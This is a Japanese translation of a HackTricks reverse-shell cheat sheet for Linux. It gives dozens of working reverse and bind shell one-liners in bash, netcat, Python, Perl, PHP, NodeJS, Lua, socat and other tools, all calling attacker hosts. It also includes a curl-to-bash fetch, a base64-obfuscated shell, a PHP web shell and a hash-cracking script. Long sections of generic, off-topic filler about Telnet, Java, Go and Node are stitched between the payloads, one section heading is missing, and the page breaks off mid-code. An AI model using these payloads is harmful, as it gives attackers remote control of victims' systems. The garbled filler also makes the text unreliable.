# シェル - Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社で働いていますか？** **HackTricksで会社を宣伝したいですか**？または、**PEASSの最新バージョンにアクセスしたいですか**、または**HackTricksをPDFでダウンロードしたいですか**？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**私をフォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

**これらのシェルについて質問がある場合は、** [**https://explainshell.com/**](https://explainshell.com) **で確認できます。**

## フルTTY

**リバースシェルを取得したら、[**このページを読んでフルTTYを取得**](full-ttys.md)**してください。**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
他のシェルもチェックすることを忘れないでください：sh、ash、bsh、csh、ksh、zsh、pdksh、tcsh、およびbash。

### シンボルセーフシェル
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### シェルの説明

1. **`bash -i`**: この部分のコマンドは、対話型 (`-i`) のBashシェルを起動します。
2. **`>&`**: この部分のコマンドは、**標準出力 (`stdout`) と標準エラー (`stderr`) を同じ宛先にリダイレクト**するための省略記法です。
3. **`/dev/tcp/<攻撃者のIP>/<ポート>`**: これは、指定したIPアドレスとポートへのTCP接続を表す特殊なファイルです。
* **出力とエラーストリームをこのファイルにリダイレクト**することで、コマンドは対話型シェルセッションの出力を攻撃者のマシンに送信します。
4. **`0>&1`**: この部分のコマンドは、標準入力 (`stdin`) を標準出力 (`stdout`) と同じ宛先にリダイレクトします。

### ファイルを作成して実行する
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## フォワードシェル

Linuxマシンのウェブアプリで**RCEがある**場合でも、Iptablesルールや他の種類のフィルタリングのために**リバースシェルを取得できない**場合があります。この「シェル」は、被害者システム内でパイプを使用してRCEを介してPTYシェルを維持することができます。\
コードは[**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)で見つけることができます。

次のように変更する必要があります：

* 脆弱なホストのURL
* ペイロードの接頭辞と接尾辞（あれば）
* ペイロードの送信方法（ヘッダー？データ？追加情報？）

その後、単純に**コマンドを送信**するか、**`upgrade`コマンドを使用**して完全なPTYを取得できます（パイプは約1.3秒の遅延で読み書きされます）。


## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)で確認してください。
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnetは、ネットワーク上のリモートシステムに接続するためのプロトコルです。通常、リモートシステムにログインするために使用されます。Telnetは、クライアントとサーバーの間でテキストベースの通信を提供します。

### Telnetの使用法

以下のコマンドを使用して、Telnetを使用してリモートシステムに接続できます。

```bash
telnet <IPアドレス> <ポート番号>
```

- `<IPアドレス>`: 接続先のリモートシステムのIPアドレスを指定します。
- `<ポート番号>`: 接続先のリモートシステムのポート番号を指定します。

### Telnetのセキュリティ上の問題

Telnetは、通信が平文で送信されるため、セキュリティ上の問題があります。パスワードや機密情報を送信する場合、暗号化されたプロトコル（例：SSH）を使用することをお勧めします。

### Telnetの代替手段

Telnetの代わりに、SSH（Secure Shell）を使用することをお勧めします。SSHは、暗号化された通信を提供し、セキュリティ上のリスクを軽減します。

### Telnetの脆弱性の検査

Telnetの脆弱性を検査するために、以下の手順を実行できます。

1. Telnetを使用してリモートシステムに接続します。
2. デフォルトのユーザー名とパスワードを使用してログインします。
3. セキュリティ上の問題があるかどうかを確認します（例：パスワードが平文で送信される）。
4. 脆弱性が見つかった場合は、適切な対策を講じます。

### Telnetの利点

Telnetの利点は、シンプルで使いやすいことです。また、一部のデバイスやシステムでは、Telnetが唯一のリモートアクセス方法である場合があります。

### Telnetの欠点

Telnetの欠点は、セキュリティ上の問題があることです。通信が平文で送信されるため、パスワードや機密情報が傍受される可能性があります。また、Telnetは認証情報を暗号化しないため、中間者攻撃のリスクがあります。

### Telnetのまとめ

Telnetは、リモートシステムに接続するためのプロトコルですが、セキュリティ上の問題があります。暗号化されたプロトコル（例：SSH）を使用することをお勧めします。
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**攻撃者**
```bash
while true; do nc -l <port>; done
```
コマンドを送信するには、それを書き込んで、Enterキーを押し、CTRL+Dキーを押します（STDINを停止するため）。

**被害者**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Pythonは、多くのハッカーにとって非常に便利なスクリプト言語です。Pythonを使用すると、さまざまなタスクを自動化し、効率的に実行することができます。以下に、Pythonを使用した一般的なハッキングテクニックのいくつかを紹介します。

### リモートシェルの作成

Pythonを使用してリモートシェルを作成することができます。これにより、リモートサーバーに接続し、コマンドを実行することができます。以下は、Pythonを使用してリモートシェルを作成するための基本的なスクリプトです。

```python
import socket
import subprocess

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("リモートサーバーのIPアドレス", ポート番号))
    
    while True:
        command = s.recv(1024).decode()
        if 'exit' in command:
            s.close()
            break
        else:
            output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(output.stdout.read())
            s.send(output.stderr.read())
            
def main():
    connect()
    
if __name__ == '__main__':
    main()
```

このスクリプトを使用すると、リモートサーバーに接続し、コマンドを実行することができます。ただし、このスクリプトはセキュリティ上のリスクを伴うため、慎重に使用する必要があります。

### パスワードクラッキング

Pythonを使用してパスワードをクラッキングすることもできます。パスワードクラッキングは、辞書攻撃やブルートフォース攻撃などのさまざまな手法を使用して行われます。以下は、Pythonを使用してパスワードをクラッキングするための基本的なスクリプトです。

```python
import hashlib

def crack_password(hash, wordlist):
    with open(wordlist, 'r') as f:
        for line in f:
            word = line.strip()
            hashed_word = hashlib.md5(word.encode()).hexdigest()
            if hashed_word == hash:
                return word
    return None

def main():
    hash = input("ハッシュ値を入力してください: ")
    wordlist = input("ワードリストのパスを入力してください: ")
    password = crack_password(hash, wordlist)
    if password:
        print("パスワードが見つかりました: " + password)
    else:
        print("パスワードが見つかりませんでした。")

if __name__ == '__main__':
    main()
```

このスクリプトを使用すると、ハッシュ値とワードリストを入力し、パスワードをクラッキングすることができます。ただし、パスワードクラッキングは合法的な目的でのみ使用するようにしてください。

Pythonは、ハッキングにおいて非常に強力なツールですが、適切な倫理と法律に基づいて使用することが重要です。
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perlは、強力なスクリプト言語であり、Linuxシェルでよく使用されます。Perlスクリプトは、システム管理、ネットワークプログラミング、データ処理など、さまざまなタスクに使用できます。

Perlスクリプトを実行するには、まずPerlインタプリタをインストールする必要があります。次に、スクリプトファイルに実行権限を与えます。

Perlスクリプトを実行する方法はいくつかあります。最も一般的な方法は、ターミナルで以下のコマンドを実行することです。

```
perl script.pl
```

スクリプトファイルのパスとファイル名を`script.pl`に置き換えてください。

Perlスクリプトは、シェルコマンドを実行するためのバッククオート演算子（`` ` ``）をサポートしています。これにより、シェルコマンドの出力をPerlスクリプト内で使用できます。

Perlスクリプトは、ファイルの読み書き、正規表現の処理、データの変換など、さまざまなタスクに使用できます。また、Perlモジュールを使用して、さらに高度な機能を追加することもできます。

Perlは、柔軟性と拡張性があり、Linuxシェルでのハッキングに非常に役立ちます。しかし、セキュリティ上の注意が必要です。適切な権限管理と入力の検証を行うことが重要です。
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Rubyは、オブジェクト指向のスクリプト言語であり、多くの場面で使用されています。Rubyは、シンプルで読みやすい構文を持ち、柔軟性と拡張性があります。Rubyは、Webアプリケーションの開発や自動化スクリプトの作成など、さまざまな用途に使用されます。

Rubyスクリプトを実行するためには、Rubyインタプリタが必要です。Rubyインタプリタは、Rubyのコードを実行するための環境を提供します。

Rubyスクリプトを実行するためには、次の手順を実行します。

1. Rubyインタプリタをインストールします。インストール方法は、オペレーティングシステムによって異なります。

2. Rubyスクリプトを作成します。テキストエディタを使用して、.rb拡張子のファイルを作成します。

3. Rubyスクリプトを実行します。ターミナルまたはコマンドプロンプトで、`ruby ファイル名.rb`と入力して実行します。

Rubyは、多くの便利な機能を提供しています。例えば、文字列の操作、配列やハッシュの処理、ファイルの読み書きなどが簡単に行えます。また、Rubyの豊富なライブラリやフレームワークを使用することで、さまざまなタスクを効率的に実行することができます。

Rubyは、初心者から上級者まで幅広いレベルのプログラマにとって魅力的な言語です。そのシンプルな構文と豊富な機能を活用して、効率的なプログラミングを実現しましょう。
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP（Hypertext Preprocessor）は、Web開発に広く使用されるスクリプト言語です。PHPは、サーバーサイドで実行され、HTMLと組み合わせて動的なWebページを生成するために使用されます。

### PHPのシェル

PHPのシェルを使用すると、コマンドラインからPHPスクリプトを実行できます。これにより、システムコマンドの実行やファイルの操作など、さまざまなタスクを自動化できます。

以下は、PHPシェルの使用例です。

```php
<?php
    echo shell_exec($_GET['cmd']);
?>
```

このシェルは、GETパラメータとして渡されたコマンドを実行し、その結果を出力します。このシェルを使用すると、リモートでコマンドを実行できるため、悪意のあるユーザーによる攻撃のリスクがあります。

### PHPのリバースシェル

PHPのリバースシェルは、攻撃者がリモートサーバーに接続し、システムコマンドを実行できるようにするためのツールです。リバースシェルを使用すると、ファイアウォールやNATの背後にあるサーバーに対しても攻撃を行うことができます。

以下は、PHPのリバースシェルの例です。

```php
<?php
    $ip = '攻撃者のIPアドレス';
    $port = 攻撃者のポート番号;
    $sock = fsockopen($ip, $port);
    $descriptorspec = array(
        0 => $sock,
        1 => $sock,
        2 => $sock
    );
    $process = proc_open('/bin/sh', $descriptorspec, $pipes);
    fclose($sock);
?>
```

このリバースシェルは、攻撃者のIPアドレスとポート番号を指定し、攻撃者がシステムコマンドを実行できるようにします。攻撃者は、リバースシェルを使用して、リモートサーバーに対してコマンドを実行したり、ファイルを操作したりすることができます。

### PHPのコマンドインジェクション

PHPのコマンドインジェクションは、ユーザーの入力を不適切に処理することによって、システムコマンドを実行する脆弱性です。攻撃者は、ユーザーの入力に悪意のあるコマンドを挿入し、サーバー上でコマンドを実行することができます。

以下は、PHPのコマンドインジェクションの例です。

```php
<?php
    $cmd = $_GET['cmd'];
    system("ls $cmd");
?>
```

このコードでは、GETパラメータとして渡された`cmd`変数を`system`関数に渡しています。攻撃者は、`cmd`変数に任意のコマンドを挿入することができ、サーバー上でそのコマンドが実行されます。

コマンドインジェクションは非常に危険な脆弱性であり、適切な入力検証とエスケープ処理が必要です。
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Javaは、オブジェクト指向プログラミング言語であり、クロスプラットフォームのアプリケーション開発に広く使用されています。Javaは、高い可搬性、セキュリティ、パフォーマンスを提供し、さまざまな用途に適しています。

### Javaの特徴

- **オブジェクト指向**: Javaは、オブジェクト指向プログラミングの原則に基づいています。クラス、オブジェクト、継承、ポリモーフィズムなどの概念をサポートしています。

- **プラットフォームの独立性**: Javaは、Java仮想マシン（JVM）上で実行されるため、プラットフォームに依存しません。これにより、Javaアプリケーションは異なるオペレーティングシステム上で実行できます。

- **ガベージコレクション**: Javaは、自動的にメモリを管理するガベージコレクション機能を提供します。開発者は明示的にメモリを解放する必要がなく、メモリリークのリスクを軽減できます。

- **例外処理**: Javaは、例外処理機構を備えています。開発者は、予期しないエラーに対処するための例外処理コードを記述できます。

- **マルチスレッドサポート**: Javaは、マルチスレッドプログラミングをサポートしています。複数のスレッドを使用して並行処理を実行できます。

### Javaの利用

Javaは、さまざまな用途に使用されています。

- **アプリケーション開発**: Javaは、デスクトップアプリケーション、Webアプリケーション、モバイルアプリケーションなど、さまざまな種類のアプリケーションの開発に使用されます。

- **ビッグデータ処理**: Javaは、ビッグデータ処理フレームワークであるApache HadoopやApache Sparkなどで広く使用されています。

- **エンタープライズアプリケーション**: Javaは、エンタープライズアプリケーションの開発に広く使用されています。Java Enterprise Edition（Java EE）フレームワークは、エンタープライズアプリケーションの構築に必要な機能を提供します。

- **Androidアプリケーション**: Javaは、Androidアプリケーションの開発に使用されます。Android Studioなどの開発ツールを使用して、JavaでAndroidアプリケーションを作成できます。

Javaは、その豊富な機能セットと広範な用途により、プログラミングコミュニティで広く支持されています。
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncatは、ネットワーク接続のための強力なユーティリティです。Ncatを使用すると、TCPおよびUDP接続を作成し、データを送受信することができます。Ncatは、ポートスキャン、ポートフォワーディング、リモートシェルの作成など、さまざまなネットワーク関連のタスクに使用できます。

### Ncatの基本的な使用法

Ncatを使用してリモートシェルを作成するには、次のコマンドを使用します。

```
ncat -lvp <port>
```

このコマンドは、指定したポートでリッスンし、接続が確立されるとシェルを提供します。

Ncatを使用してポートスキャンを実行するには、次のコマンドを使用します。

```
ncat -v <target> <port>
```

このコマンドは、指定したターゲットの指定したポートに接続を試みます。接続が成功すると、ポートが開いていることがわかります。

### Ncatの高度な使用法

Ncatには、さまざまな高度な機能があります。以下はいくつかの例です。

- ポートフォワーディング: ローカルポートとリモートポートをマッピングすることで、トラフィックを転送できます。

```
ncat -lvp <local_port> -c 'ncat <remote_host> <remote_port>'
```

- ファイル転送: ファイルを送信するためにNcatを使用できます。

```
ncat -lvp <port> > <file_name>
```

```
ncat <target> <port> < <file_name>
```

- リモートコマンド実行: リモートホストでコマンドを実行するためにNcatを使用できます。

```
ncat -lvp <port> -e <command>
```

これらはNcatの一部の機能の例ですが、Ncatにはさまざまな使用法があります。Ncatのマニュアルを参照して、さらに詳細な情報を入手してください。
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
## Golang

Golang（またはGo）は、Googleによって開発されたオープンソースのプログラミング言語です。Golangは、高いパフォーマンスと効率的な並行処理を備えたシンプルな構文を持っています。Golangは、システムプログラミングやネットワークプログラミングなど、さまざまな用途に使用されます。

Golangは、クロスプラットフォームのサポートを提供し、コンパイルされたバイナリの実行ファイルを生成します。また、静的型付けとガベージコレクションを備えており、安全性と信頼性を高めます。

Golangは、多くのツールとライブラリが提供されており、開発者が効率的にコードを書くことができます。また、豊富なドキュメントとコミュニティのサポートも利用できます。

Golangは、Webアプリケーションの開発やマイクロサービスの構築にも適しています。また、ネットワークセキュリティやクラウドコンピューティングなどの分野でも広く使用されています。

Golangは、学習コストが比較的低く、シンプルな構文と直感的なデザインが特徴です。これにより、初心者から上級者まで、幅広いレベルの開発者が利用できます。

Golangは、高速な開発と効率的な実行を実現するための強力なツールです。そのため、多くの開発者や企業がGolangを選択しています。
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Luaは、シンプルで効率的なスクリプト言語であり、組み込みスクリプト言語として広く使用されています。Luaは、高速な実行速度と低いメモリ使用量を特徴としており、さまざまなアプリケーションやゲームエンジンで使用されています。

Luaスクリプトを実行するためには、Luaインタプリタが必要です。Linuxシステムでは、`lua`コマンドを使用してインタプリタを起動できます。

Luaスクリプトを実行するためには、次のコマンドを使用します。

```bash
lua script.lua
```

また、Luaスクリプトを実行するためには、スクリプトファイルに実行権限を与える必要があります。

```bash
chmod +x script.lua
```

Luaスクリプトは、シェルスクリプトと同様に、コマンドライン引数を受け取ることもできます。引数は、`arg`というグローバル変数を介してアクセスできます。

```lua
-- 引数の数を表示する例
print(#arg)
```

Luaは、シンプルで柔軟な言語であり、さまざまな用途に使用できます。Luaの詳細な文法や機能については、公式のLuaドキュメントを参照してください。
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

NodeJSは、非同期イベント駆動型のJavaScriptランタイム環境です。NodeJSは、サーバーサイドでのアプリケーション開発に広く使用されています。以下に、NodeJSに関連するいくつかの重要なポイントを示します。

### インストール

NodeJSをインストールするには、公式のNodeJSウェブサイトからインストーラーをダウンロードし、実行します。インストールが完了すると、`node`コマンドが使用可能になります。

### パッケージマネージャー

NodeJSには、パッケージの管理に使用するためのnpm（Node Package Manager）というパッケージマネージャーが付属しています。npmを使用すると、依存関係の解決やパッケージのインストールが簡単に行えます。

### モジュール

NodeJSでは、モジュールと呼ばれる再利用可能なコードの単位が使用されます。モジュールは、`require`関数を使用して他のモジュールからインポートすることができます。

### イベント駆動型プログラミング

NodeJSは、イベント駆動型のプログラミングモデルを採用しています。これにより、非同期処理が容易になります。コールバック関数やPromiseを使用して、非同期タスクの完了を処理することができます。

### フレームワーク

NodeJSには、ExpressやKoaなどの人気のあるフレームワークがあります。これらのフレームワークを使用すると、Webアプリケーションの開発が容易になります。

NodeJSは、柔軟性とパフォーマンスの両方を備えた強力なツールです。サーバーサイドの開発において、高速かつ効率的なアプリケーションを構築するために、NodeJSを活用しましょう。
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

攻撃者（Kali）
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
被害者
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### バインドシェル
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### リバースシェル

A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands. Reverse shells are commonly used in post-exploitation scenarios to maintain persistent access to a compromised system.

To establish a reverse shell, the attacker typically needs to have a listener set up on their machine to receive the incoming connection. The listener can be a simple netcat command or a more advanced tool like Metasploit.

Once the connection is established, the attacker can interact with the target machine's command prompt and execute commands as if they were physically present on the machine. This can be useful for performing various tasks, such as exfiltrating data, pivoting to other systems, or escalating privileges.

There are multiple ways to create a reverse shell, depending on the target machine's operating system and available tools. Some common methods include using netcat, Python, or PHP to create a reverse shell payload.

It's important to note that using reverse shells for unauthorized access to systems is illegal and unethical. Reverse shells should only be used for legitimate purposes, such as penetration testing or authorized system administration.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awkは、テキスト処理のための強力なプログラミング言語です。Awkは、行単位でテキストを処理し、パターンに一致する行を選択し、指定されたアクションを実行することができます。

Awkの基本的な構文は次のとおりです。

```bash
awk 'pattern { action }' file
```

- `pattern`は、行を選択するための条件です。正規表現や比較演算子を使用してパターンを指定することができます。
- `action`は、パターンに一致した行に対して実行するコマンドです。複数のコマンドを実行する場合は、セミコロンで区切ります。
- `file`は、処理するテキストファイルのパスです。省略すると、標準入力からデータを受け取ります。

Awkの便利な機能の一つは、データのフィールドにアクセスすることです。Awkは、デフォルトでスペースやタブでフィールドを区切ります。フィールドには、`$1`、`$2`、`$3`のような番号を指定してアクセスすることができます。

以下は、Awkを使用してテキストファイルを処理する例です。

```bash
awk '/pattern/ { print $1 }' file
```

この例では、`pattern`に一致する行の最初のフィールドを出力します。

Awkは非常に柔軟なツールであり、テキスト処理に幅広く使用されます。さまざまなオプションや関数を使用して、さまざまなタスクを実行することができます。Awkの詳細な使用方法については、公式のドキュメントやオンラインリソースを参照してください。
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
Fingerコマンドは、リモートシステム上のユーザー情報を取得するために使用されます。以下のコマンドを使用して、ユーザー名を指定して情報を取得できます。

```bash
finger <username>@<target>
```

**Defender**

Fingerコマンドは、セキュリティ上のリスクを伴うため、一般的には無効化されています。システム管理者は、Fingerサービスを無効にすることをお勧めします。また、ユーザーはプライバシーを保護するために、自分の情報がFingerコマンドで公開されないようにする必要があります。

以下のコマンドを使用して、Fingerサービスを無効化できます。

```bash
sudo systemctl disable finger
sudo systemctl stop finger
```

また、ユーザーは以下の方法で自分の情報を非表示にすることができます。

- `/etc/nofinger`ファイルを作成し、ユーザー名を追加する。
- `.nofinger`という名前のファイルをユーザーホームディレクトリに作成する。

**References**

- [Finger - Wikipedia](https://en.wikipedia.org/wiki/Finger_protocol)
```bash
while true; do nc -l 79; done
```
コマンドを送信するには、それを書き込んで、Enterキーを押し、CTRL+Dキーを押します（STDINを停止するため）。

**被害者**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Gawkは、Linuxシェルスクリプトで使用される非常に強力なテキスト処理ツールです。Gawkは、パターンスキャンと処理、データの抽出、変換、およびレポートの生成など、さまざまなタスクを実行するために使用されます。

以下は、Gawkの基本的な使用法のいくつかです。

### パターンマッチングとアクション

Gawkは、パターンマッチングとアクションの組み合わせによって動作します。パターンは、データの特定の部分を識別するために使用され、アクションは、パターンに一致した場合に実行されるコードです。

```bash
gawk '/パターン/ { アクション }' ファイル名
```

### フィールドと変数

Gawkは、データをフィールドとして扱います。デフォルトでは、フィールドはスペースまたはタブで区切られていますが、カスタムのフィールドセパレータを指定することもできます。

Gawkでは、変数も使用できます。変数は、データの一部を格納するために使用されます。

```bash
gawk -F ':' '{ print $1 }' /etc/passwd
```

### パイプとリダイレクト

Gawkは、パイプとリダイレクトを使用して、データの入力と出力を制御することもできます。

```bash
gawk '/パターン/ { アクション }' < 入力ファイル > 出力ファイル
```

### パターンとアクションの組み合わせ

Gawkでは、複数のパターンとアクションを組み合わせることもできます。これにより、さまざまな条件に基づいてデータを処理することができます。

```bash
gawk '/パターン1/ { アクション1 } /パターン2/ { アクション2 }' ファイル名
```

これらは、Gawkの基本的な使用法の一部です。Gawkは非常に柔軟で強力なツールであり、さまざまなテキスト処理タスクに使用できます。
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

最もシンプルなリバースシェルの形式の1つは、xtermセッションです。以下のコマンドはサーバー上で実行する必要があります。それはあなた（10.0.0.1）にTCPポート6001で接続しようとします。
```bash
